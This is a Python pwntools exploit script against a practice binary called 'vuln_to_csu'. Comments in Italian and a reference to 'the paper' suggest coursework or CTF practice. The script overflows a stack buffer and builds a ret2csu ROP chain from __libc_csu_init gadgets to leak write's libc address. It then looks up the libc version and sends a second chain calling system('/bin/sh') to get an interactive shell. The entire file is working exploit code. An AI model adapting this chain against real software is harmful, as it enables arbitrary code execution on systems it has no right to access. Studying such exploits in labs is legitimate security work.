from pwn import *
from pylibcdb.LibcDB import LibcDB

elf = ELF("./vuln_to_csu")
rop = ROP(elf)
pty = process.PTY #ubuntu buffering
p = process("./vuln_to_csu",stdin=pty, stdout=pty)

payload_base = "A".encode()*40

main = elf.symbols['main']
print("Found main at", hex(main))
libc_csu_init = elf.symbols['__libc_csu_init']
print("Found __libc_csu_init", hex(libc_csu_init))
gadget_one = libc_csu_init + 90
print("Computed gadget_one", hex(gadget_one))
gadget_two = libc_csu_init + 64
print("Computed gadget_two", hex(gadget_two))

write_got = elf.got['write']
print("Found write got", hex(write_got))

ret = rop.find_gadget(["ret"])
print("Found ret_gadget", hex(ret.address))

payload = payload_base

#paper ROP chains
"""payload += p64(gadget_one) #RIP
payload += p64(0) #rbx
payload += p64(0) #rbp 
payload += p64(write_plt)           #r12
payload += p64(8) #byte to write     r13
payload += p64(write_plt)           #r14
payload += p64(0) #file descriptor   r15
payload += p64(gadget_two) """

#STAGE 1

#from objdump we can see that gadget_two is different, r13 is switched with r15
payload += p64(ret.address)
payload += p64(gadget_one) #RIP
payload += p64(0) #rbx
payload += p64(1) #rbp <----- add rbx, 1; cmp rbx, rbp ---> (cmp 1, 1)
payload += p64(write_got)           #r12
payload += p64(1) #file descriptor   r15      <------  invertiti dal paper
payload += p64(write_got)           #r14
payload += p64(8) #byte to write     r13      <------
payload += p64(gadget_two)
payload += p64(main)*10     #after cmp rbx,rbp we need to survive a lot of pop operation to reach ret with main on stack

#gdb.attach(p)
print(p.recvuntil(b'\n'))
p.sendline(payload)
write_libc = u64(p.recv(8))
print("Leaked write libc address", hex(write_libc))

libcdb = LibcDB("/home/exploitation/libc-database/")
libc_name = libcdb.find_by_address(hex(write_libc), symbol="write")
print("Libc name ", libc_name)
libc_path = libcdb.download_by_name(libc_name)
print("Libc path ", libc_path)

libc = ELF(libc_path)
libc.address = write_libc - libc.sym["write"]
print("Libc base address ", hex(libc.address))

binsh = next(libc.search("/bin/sh".encode()))
print("/bin/sh found at", hex(binsh))
system = libc.sym["system"]
print("System found at", hex(system))

#STAGE 2
print(p.recvuntil(b'\n'))
payload = payload_base
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()